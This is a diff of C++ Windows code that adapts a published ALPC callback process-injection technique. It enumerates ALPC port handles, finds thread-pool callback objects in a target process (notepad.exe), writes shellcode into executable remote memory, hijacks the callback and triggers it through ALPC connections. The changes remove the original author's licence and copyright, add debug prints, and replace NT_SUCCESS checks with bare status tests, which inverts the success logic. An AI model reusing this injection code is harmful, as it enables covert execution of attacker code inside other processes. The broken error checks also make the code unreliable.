@@ -1,38 +1,45 @@
-﻿/**
-  Copyright © 2019 Odzhan. All Rights Reserved.
+﻿/*
+* 通过test_proj里的扫描句柄功能，扫描出来下面的句柄类型和num的对应关系，这里alpc对应46
+explorer.exe
+{
+    "3": "Directory",
+    "5" : "Token",
+    "7" : "Process",
+    "8" : "Thread",
+    "11" : "IoCompletionReserve",
+    "16" : "Event",
+    "17" : "Mutant",
+    "19" : "Semaphore",
+    "20" : "Timer",
+    "21" : "IRTimer",
+    "24" : "WindowStation",
+    "25" : "Desktop",
+    "30" : "TpWorkerFactory",
+    "35" : "IoCompletion",
+    "36" : "WaitCompletionPacket",
+    "37" : "File",
+    "42" : "Section",
+    "44" : "Key",
+    "46" : "ALPC Port",
+    "49" : "WmiGuid",
+    "67" : "DxgkCompositionObject"
+}
+*/
 
-  Redistribution and use in source and binary forms, with or without
-  modification, are permitted provided that the following conditions are
-  met:
+// # include "ntlib_modexp\util.h"
 
-  1. Redistributions of source code must retain the above copyright
-  notice, this list of conditions and the following disclaimer.
-
-  2. Redistributions in binary form must reproduce the above copyright
-  notice, this list of conditions and the following disclaimer in the
-  documentation and/or other materials provided with the distribution.
-
-  3. The name of the author may not be used to endorse or promote products
-  derived from this software without specific prior written permission.
-
-  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
-  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
-  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
-  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
-  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
-  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
-  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
-  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
-  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
-  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
-  POSSIBILITY OF SUCH DAMAGE. */
-
-# include "ntlib_modexp\util.h"
-
+#include <Windows.h>
+#include <Shlwapi.h>
+#include <Psapi.h>
 
 #include <cstdio>
 #include <vector>
 #include <string>
+
+#include "utils.h"
+#include "ntStructs.h"
+
+
 
 typedef struct _process_info_t_alpccallback {
     DWORD                     pid;             // process id
@@ -62,12 +69,13 @@ DWORD GetALPCPorts(process_info_alpccallback* pi)
     pi->ports.clear();
 
     // get a list of handles for the local system
-    for (len = MAX_BUFSIZ;;len += MAX_BUFSIZ) {
+    for (len = MAX_BUFSIZ;;len += MAX_BUFSIZ) 
+    {
         list = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, len);
         status = NtQuerySystemInformation(
             (SYSTEM_INFORMATION_CLASS)SystemHandleInformation, list, len, &total);
         // break from loop if ok    
-        if (NT_SUCCESS(status)) break;
+        if ((status)) break;
         // free list and continue
         HeapFree(GetProcessHeap(), 0, list);
     }
@@ -76,35 +84,53 @@ DWORD GetALPCPorts(process_info_alpccallback* pi)
     objName = (POBJECT_NAME_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 8192);
 
     // for each handle
-    for (i = 0; i < hl->NumberOfHandles; i++) {
+    for (i = 0; i < hl->NumberOfHandles; i++) 
+    {
+        if (hl->Handles[i].UniqueProcessId <= 5) continue;
+        
+        // wprintf(L"process : %-10s\t%-5d\t%d\n", pid2name(hl->Handles[i].UniqueProcessId), hl->Handles[i].UniqueProcessId, hl->Handles[i].ObjectTypeIndex);
+
         // skip if process ids don't match
         if (hl->Handles[i].UniqueProcessId != pi->pid) continue;
 
         // skip if the type isn't an ALPC port
         // note this value might be different on other systems.
         // this was tested on 64-bit Windows 10
-        if (hl->Handles[i].ObjectTypeIndex != 45) continue;
 
+        //if (hl->Handles[i].ObjectTypeIndex != 45) continue;
+        if (hl->Handles[i].ObjectTypeIndex != 46) continue; // 我查到的是46->alpc
+
+
+
+        printf("[fliter] hl->Handles[i].UniqueProcessId succeed\n");
         // duplicate the handle object
         status = NtDuplicateObject(
             pi->hp, (HANDLE)hl->Handles[i].HandleValue,
             GetCurrentProcess(), &hObj, 0, 0, 0);
 
         // continue with next entry if we failed
-        if (!NT_SUCCESS(status)) continue;
+        if ((status)) continue;
 
         // try query the name
         status = NtQueryObject(hObj,
             (OBJECT_INFORMATION_CLASS)ObjectNameInformation, objName, 8192, NULL);
 
         // got it okay?
-        if (NT_SUCCESS(status) && objName->Name.Buffer != NULL) {
+        if ((status) && objName->Name.Buffer != NULL) {
             // save to list
             pi->ports.push_back(objName->Name.Buffer);
         }
+        printf("GetALPCPorts func end\n");
         // close handle object
         CloseHandle(hObj);
     }
+
+    if (pi->ports.size() == 0)
+    {
+        printf("pi->ports.size() == 0\n");
+    }
+
+
     // free list of handles
     HeapFree(GetProcessHeap(), 0, objName);
     HeapFree(GetProcessHeap(), 0, list);
@@ -112,7 +138,8 @@ DWORD GetALPCPorts(process_info_alpccallback* pi)
 }
 
 // connect to ALPC port
-BOOL ALPC_Connect(std::wstring path) {
+BOOL ALPC_Connect(std::wstring path) 
+{
     SECURITY_QUALITY_OF_SERVICE ss;
     NTSTATUS                    status;
     UNICODE_STRING              server;
@@ -127,36 +154,48 @@ BOOL ALPC_Connect(std::wstring path) {
 
     RtlInitUnicodeString(&server, path.c_str());
 
-    status = NtConnectPort(&h, &server, &ss, NULL,
-        NULL, (PULONG)&MsgLen, NULL, NULL);
+    status = NtConnectPort(
+        &h, 
+        &server, 
+        &ss, 
+        NULL,
+        NULL, 
+        (PULONG)&MsgLen, 
+        NULL, 
+        NULL
+    );
+    
+    printf("NtConnectPort status: %x\n", status);
 
-    NtClose(h);
+    CloseHandle(h);
 
-    return NT_SUCCESS(status);
+    return status?TRUE:FALSE;
 }
 
 // try inject and run payload in remote process using TCO
-BOOL ALPC_deploy(process_info_alpccallback* pi, LPVOID ds, PTP_CALLBACK_OBJECT tco) {
+BOOL ALPC_deploy(process_info_alpccallback* pi, LPVOID ds, PTP_CALLBACK_OBJECT_alpccallback tco) 
+{
     LPVOID             cs = NULL;
     BOOL               bInject = FALSE;
-    TP_CALLBACK_OBJECT cpy;    // local copy of tco
+    TP_CALLBACK_OBJECT_alpccallback cpy;    // local copy of tco
     SIZE_T             wr;
-    TP_SIMPLE_CALLBACK tp;
+    TP_SIMPLE_CALLBACK_alpccallback tp;
     DWORD              i;
 
     // allocate memory in remote for payload and callback parameter
     cs = VirtualAllocEx(pi->hp, NULL,
-        pi->payloadSize + sizeof(TP_SIMPLE_CALLBACK),
+        pi->payloadSize + sizeof(PTP_SIMPLE_CALLBACK_alpccallback),
         MEM_COMMIT, PAGE_EXECUTE_READWRITE);
-
-    if (cs != NULL) {
+    wprintf(L"virtual shellcode mem succeed %p\n", cs);
+    if (cs != NULL) 
+    {
         // write payload to remote process
         WriteProcessMemory(pi->hp, cs, pi->payload, pi->payloadSize, &wr);
         // backup TCO
-        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT));
+        CopyMemory(&cpy, tco, sizeof(TP_CALLBACK_OBJECT_alpccallback));
         // copy original callback address and parameter
-        tp.Function = cpy.Callback.Function;
-        tp.Context = cpy.Callback.Context;
+        tp.Function = cpy.CallerAddress.Function;
+        tp.Context = cpy.CallerAddress.Context;
         // write callback+parameter to remote process
         WriteProcessMemory(pi->hp, (LPBYTE)cs + pi->payloadSize, &tp, sizeof(tp), &wr);
         // update original callback with address of payload and parameter
@@ -164,8 +203,11 @@ BOOL ALPC_deploy(process_info_alpccallback* pi, LPVOID ds, PTP_CALLBACK_OBJECT t
         cpy.Callback.Context = (LPBYTE)cs + pi->payloadSize;
         // update TCO in remote process
         WriteProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
+        
+        wprintf(L"wpm * 3 finish\n");
         // trigger execution of payload
-        for (i = 0;i < pi->ports.size(); i++) {
+        for (i = 0;i < pi->ports.size(); i++) 
+        {
             ALPC_Connect(pi->ports[i]);
             // read back the TCO
             ReadProcessMemory(pi->hp, ds, &cpy, sizeof(cpy), &wr);
@@ -183,7 +225,7 @@ BOOL ALPC_deploy(process_info_alpccallback* pi, LPVOID ds, PTP_CALLBACK_OBJECT t
 }
 
 // validates a callback object
-BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT tco) 
+BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT_alpccallback tco)
 {
     MEMORY_BASIC_INFORMATION mbi;
     SIZE_T                   res;
@@ -211,15 +253,23 @@ BOOL IsValidTCO(HANDLE hProcess, PTP_CALLBACK_OBJECT tco)
     if (!(mbi.Protect & PAGE_READWRITE)) return FALSE;
 
     // the caller function should reside in read+executable memory
-    res = VirtualQueryEx(hProcess,
-        (LPCVOID)tco->CallerAddress.Function, &mbi, sizeof(mbi));
+    res = VirtualQueryEx(
+        hProcess,
+        (LPCVOID)tco->CallerAddress.Function, 
+        &mbi, 
+        sizeof(mbi)
+    );
 
     if (res != sizeof(mbi)) return FALSE;
     if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
 
     // the callback function should reside in read+executable memory
-    res = VirtualQueryEx(hProcess,
-        (LPCVOID)tco->Callback.Function, &mbi, sizeof(mbi));
+    res = VirtualQueryEx(
+        hProcess,
+        (LPCVOID)tco->Callback.Function, 
+        &mbi, 
+        sizeof(mbi)
+    );
 
     if (res != sizeof(mbi)) return FALSE;
     return (mbi.Protect & PAGE_EXECUTE_READ);
@@ -231,33 +281,34 @@ BOOL FindEnviron(process_info_alpccallback* pi, LPVOID BaseAddress, SIZE_T Regio
     SIZE_T               pos;
     BOOL                 bRead, bFound, bInject = FALSE;
     SIZE_T               rd;
-    TP_CALLBACK_OBJECT tco;
+    TP_CALLBACK_OBJECT_alpccallback tco;
     WCHAR                filename[MAX_PATH];
 
     // scan memory for TCO
     for (pos = 0; pos < RegionSize;
-        pos += (bFound ? sizeof(TP_CALLBACK_OBJECT) : sizeof(ULONG_PTR)))
+        pos += (bFound ? sizeof(TP_CALLBACK_OBJECT_alpccallback) : sizeof(ULONG_PTR)))
     {
         bFound = FALSE;
         // try read TCO from writeable memory
         bRead = ReadProcessMemory(pi->hp,
-            &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT), &rd);
+            &addr[pos], &tco, sizeof(TP_CALLBACK_OBJECT_alpccallback), &rd);
 
         // if not read, continue
         if (!bRead) continue;
         // if not size of callback environ, continue
-        if (rd != sizeof(TP_CALLBACK_OBJECT)) continue;
+        if (rd != sizeof(TP_CALLBACK_OBJECT_alpccallback)) continue;
 
         // is this a valid TCO?
         bFound = IsValidTCO(pi->hp, &tco);
         if (bFound) {
             // obtain module name where callback resides
-            GetMappedFileName(pi->hp, (LPVOID)tco.Callback.Function, filename, MAX_PATH);
+            GetMappedFileNameW(pi->hp, (LPVOID)tco.Callback.Function, filename, MAX_PATH);
             // filter by RPCRT4.dll
-            if (StrStrI(filename, L"RPCRT4.dll") != NULL) {
+            if (StrStrIW(filename, L"RPCRT4.dll") != NULL) {
                 wprintf(L"Found TCO at %p for %s\n", addr + pos, filename);
                 // try run payload using this TCO
                 // if successful, end scan
+
                 bInject = ALPC_deploy(pi, addr + pos, &tco);
                 if (bInject) break;
             }
@@ -311,11 +362,11 @@ BOOL ALPC_inject(process_info_alpccallback* pi)
 
 int AlpcCallbackExecute() 
 {
-    PWCHAR* argv;
-    int          argc;
+    printf("run  AlpcCallbackExecute \n");
+
     process_info_alpccallback pi;
 
-    if (!SetPrivilege(SE_DEBUG_NAME, TRUE)) 
+    if (!SetPrivilege((PWCHAR)SE_DEBUG_NAME, TRUE))
     {
         wprintf(L"can't enable debug privilege.\n");
     }
@@ -349,12 +400,13 @@ int AlpcCallbackExecute()
 
     // try read pic
     pi.payloadSize = sizeof(shellcode);
-
-    pi.pid = name2pid(L"notepad.exe");
+    pi.payload = shellcode;
+    pi.name = (PWCHAR)L"notepad.exe";
+    pi.pid = name2pid((PWCHAR)L"notepad.exe");
 
     if (pi.pid == 0) 
     {
-        wprintf(L"unable to obtain process id for %s\n", argv[2]);
+        wprintf(L"unable to obtain process id \n");
         return 0;
     }
     wprintf(L"ALPC injection : %s\n",
